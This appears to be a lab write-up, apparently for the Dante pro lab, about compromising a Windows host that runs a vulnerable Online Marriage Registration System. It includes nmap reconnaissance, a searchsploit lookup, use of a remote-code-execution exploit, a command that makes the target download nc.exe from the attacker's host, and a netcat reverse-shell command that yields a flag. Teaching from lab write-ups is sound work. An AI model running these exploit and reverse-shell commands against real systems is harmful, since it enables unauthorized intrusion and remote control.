# Reconnaissances
## 172.16.1.102
```
$ proxychains nmap -sT -sV -Pn -T5 172.16.1.102
```
```bash
Nmap scan report for 172.16.1.102
Host is up (0.20s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 242.09 seconds
```

### Observe the HTTP
```
$ proxychains firefox 172.16.1.102
```
```
Marriage Registration System
```

Try to search exploit for `Marriage Registration System`
```
$ searchsploit "Marriage Registration System"
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Online Marriage Registration System (OMRS) 1.0 - Remote Code Execution (2)                                                                | php/webapps/49260.py
Online Marriage Registration System (OMRS) 1.0 - Remote code execution (3)                                                                | php/webapps/49557.py
Online Marriage Registration System 1.0 - 'searchdata' SQL Injection                                                                      | php/webapps/49307.txt
Online Marriage Registration System 1.0 - Persistent Cross-Site Scripting                                                                 | php/webapps/48522.txt
Online Marriage Registration System 1.0 - Remote Code Execution (1)                                                                       | php/webapps/48552.sh
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

How to use the exploit
```
$ cp /usr/share/exploitdb/exploits/php/webapps/49557.py .
$ cat 49557.py  
```
```bash
# Exploit Title: Online Marriage Registration System (OMRS) 1.0 - Remote code execution (3)
# Date: 10/02/2021
# Exploit Author: Ricardo Ruiz (@ricardojoserf)
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/online-marriage-registration-system-using-php-and-mysql/
# Version: 1.0
# Tested on: Windows 10/Xampp Server and Wamp Server
# Porting an existing exploit (https://www.exploit-db.com/exploits/49260, for macOs) to Linux/Windows. Adding the possibility of automatic registration and execution of any command without needing to upload any local file
# Example with registration:    python3 script.py -u http://172.16.1.102:80/ -c 'whoami'
# Example without registration: python3 script.py -u http://172.16.1.102:80/ -c 'whoami' -m 680123456 -p dante123

```

Try to register a new user
```
$ proxychains firefox http://172.16.1.102/user/signup.php
```

Then exploit it
```
$ proxychains python3 49557.py -u http://172.16.1.102/ -c 'whoami' -m 680123456 -p dante123
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.102:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.102:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.102:80  ...  OK
[+] PHP shell uploaded
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.102:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.102:80  ...  OK
[+] Command output
dante-ws03\blake
```

Upload `nc.exe` via http
```
$ python3 -m http.server 80
```
```
$ proxychains python3 49557.py -u http://172.16.1.102/ -c "powershell wget 10.10.14.2/nc.exe -o nc.exe" -m 680123456 -p dante123
```

Get reverse shell
```
$ nc -lvnp 9001
$ proxychains python3 49557.py -u http://172.16.1.102/ -c "nc.exe -e cmd.exe 10.10.14.2 9001" -m 680123456 -p dante123
```
```
connect to [10.10.14.2] from (UNKNOWN) [10.10.110.3] 32725
Microsoft Windows [Version 10.0.19042.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Apache24\htdocs\user\images>type c:\users\blake\Desktop\flag.txt
type c:\users\blake\Desktop\flag.txt
DANTE{U_M4y_Kiss_Th3_Br1d3}
```